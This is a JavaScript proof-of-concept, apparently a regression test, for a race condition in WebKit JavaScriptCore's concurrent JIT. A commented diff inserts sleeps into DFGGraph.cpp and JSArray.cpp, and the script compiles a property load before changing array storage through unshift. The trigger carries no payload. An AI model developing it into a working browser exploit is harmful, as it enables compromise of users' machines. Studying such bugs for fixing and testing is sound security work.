/*
diff --git a/Source/JavaScriptCore/dfg/DFGGraph.cpp b/Source/JavaScriptCore/dfg/DFGGraph.cpp
index 07aed18ca1b4..157a836cf50e 100644
--- a/Source/JavaScriptCore/dfg/DFGGraph.cpp
+++ b/Source/JavaScriptCore/dfg/DFGGraph.cpp
@@ -25,6 +25,7 @@
 
 #include "config.h"
 #include "DFGGraph.h"
+#include "runtime/JSCast.h"
 
 #if ENABLE(DFG_JIT)
 
@@ -1337,6 +1338,10 @@ JSValue Graph::tryGetConstantProperty(
     Structure* structure = object->structure();
     if (!structureSet.toStructureSet().contains(structure))
         return JSValue();
+    
+    if (jsDynamicCast<JSArray*>(object)) {
+        usleep(1000 * 1000);
+    }
 
     return object->getDirectConcurrently(structure, offset);
 }
diff --git a/Source/JavaScriptCore/runtime/JSArray.cpp b/Source/JavaScriptCore/runtime/JSArray.cpp
index 7b8907517f9e..f18e5b3a9e0c 100644
--- a/Source/JavaScriptCore/runtime/JSArray.cpp
+++ b/Source/JavaScriptCore/runtime/JSArray.cpp
@@ -1033,6 +1033,9 @@ bool JSArray::unshiftCountWithArrayStorage(JSGlobalObject* globalObject, unsigne
         Structure* structure = this->structure();
         ConcurrentJSLocker structureLock(structure->lock());
         Butterfly* newButterfly = storage->butterfly()->unshift(structure, count);
+
+        usleep(1000 * 2000);
+
         storage = newButterfly->arrayStorage();
         storage->m_indexBias -= count;
         storage->setVectorLength(vectorLength + count);
*/

async function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, ms);
    });
}

const container = {};

function opt() {
    const object = container.abc;

    return object.x;
}

async function main() {
    const array = [];
    array[1000] = 1.1;
    array.fill(1.1);
    array.unshift(1.1);

    array.__defineGetter__('x', () => 1);

    container.abc = array;

    for (let i = 0; i < 0x10000; i++) {
        opt();
    }

    await sleep(250);

    array.y = 0x2222;
    array.unshift(1.1, 2.2, 3.3);

    await sleep(2000);
}

main();
